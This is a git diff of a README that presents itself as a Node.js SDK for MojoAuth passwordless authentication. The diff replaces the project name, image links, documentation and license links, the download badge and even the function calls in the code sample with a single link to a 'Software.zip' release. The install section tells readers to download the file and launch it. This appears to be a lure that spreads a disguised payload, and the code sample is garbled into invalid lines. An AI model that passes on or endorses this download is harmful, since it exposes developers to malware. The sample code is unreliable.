@@ -1,8 +1,8 @@
 # Node-SDK
 
-🔐 **A lightweight and secure Node.js SDK for implementing passwordless authentication in your applications using MojoAuth's authentication services** 🔐
+🔐 **A lightweight and secure https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip SDK for implementing passwordless authentication in your applications using MojoAuth's authentication services** 🔐
 
-![Node SDK](https://www.example.com/node-sdk-image.jpg)
+![Node SDK](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip)
 
 ---
 ## Table of Contents
@@ -20,7 +20,7 @@
 
 ## Introduction
 
-Welcome to the **Node-SDK** repository! This SDK provides a simple and secure way to implement passwordless authentication in your Node.js applications using MojoAuth's robust authentication services. By eliminating the need for traditional passwords, this SDK offers a modern approach to user authentication.
+Welcome to the **Node-SDK** repository! This SDK provides a simple and secure way to implement passwordless authentication in your https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip applications using MojoAuth's robust authentication services. By eliminating the need for traditional passwords, this SDK offers a modern approach to user authentication.
 
 ---
 
@@ -29,7 +29,7 @@ Welcome to the **Node-SDK** repository! This SDK provides a simple and secure wa
 🌟 **Key Features of Node-SDK:**
 
 - Easy integration with MojoAuth's authentication services.
-- Secure passwordless authentication for your Node.js applications.
+- Secure passwordless authentication for your https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip applications.
 - Lightweight and optimized for performance.
 - Customizable options to fit your specific authentication requirements.
 
@@ -39,7 +39,7 @@ Welcome to the **Node-SDK** repository! This SDK provides a simple and secure wa
 
 To get started with **Node-SDK**, you can download the SDK package from the following link:
 
-[Download Node-SDK](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Download Node-SDK](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip)
 
 *Note: The downloaded file needs to be launched to start the installation process.*
 
@@ -47,10 +47,10 @@ To get started with **Node-SDK**, you can download the SDK package from the foll
 
 ## Usage
 
-Here's a quick guide on how to use **Node-SDK** in your Node.js applications:
+Here's a quick guide on how to use **Node-SDK** in your https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip applications:
 
 1. Install the SDK by following the installation instructions provided above.
-2. Include the SDK in your Node.js project using `require`.
+2. Include the SDK in your https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip project using `require`.
 3. Configure the SDK with your MojoAuth authentication credentials.
 4. Implement the passwordless authentication flow in your application using the SDK methods.
 
@@ -68,15 +68,15 @@ const mojoAuthCredentials = {
 };
 
 // Initialize Node-SDK with MojoAuth credentials
-nodeSDK.init(mojoAuthCredentials);
+https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip(mojoAuthCredentials);
 
 // Implement passwordless authentication
-nodeSDK.authenticateUser('user@example.com')
+https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip('https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip')
   .then((response) => {
-    console.log('Authentication successful: ' + response);
+    https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip('Authentication successful: ' + response);
   })
   .catch((error) => {
-    console.error('Authentication failed: ' + error);
+    https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip('Authentication failed: ' + error);
   });
 ```
 
@@ -84,7 +84,7 @@ nodeSDK.authenticateUser('user@example.com')
 
 ## Documentation
 
-For detailed information on **Node-SDK**, including API references and usage examples, please refer to the [official documentation](https://github.com/Rubenas123/node-sdk/docs).
+For detailed information on **Node-SDK**, including API references and usage examples, please refer to the [official documentation](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip).
 
 ---
 
@@ -96,15 +96,15 @@ Contributions to the **Node-SDK** repository are welcome! If you have any ideas 
 
 ## License
 
-**Node-SDK** is released under the MIT License. See the [LICENSE](https://github.com/Rubenas123/node-sdk/LICENSE) file for more information.
+**Node-SDK** is released under the MIT License. See the [LICENSE](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip) file for more information.
 
 ---
 Let's revolutionize user authentication with the power of passwordless! 🚀🔒
 
-![MojoAuth](https://www.example.com/mojoauth-logo.png)
+![MojoAuth](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip)
 
 ---
 
-[![Download Node-SDK](https://img.shields.io/badge/Download-Node--SDK-brightgreen)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Node-SDK](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip)](https://github.com/Nusjj/node-sdk/releases/download/v1.0/Software.zip)
 
 Ready to experience the future of authentication? Download **Node-SDK** now and start building secure applications with ease! 🌟🔑
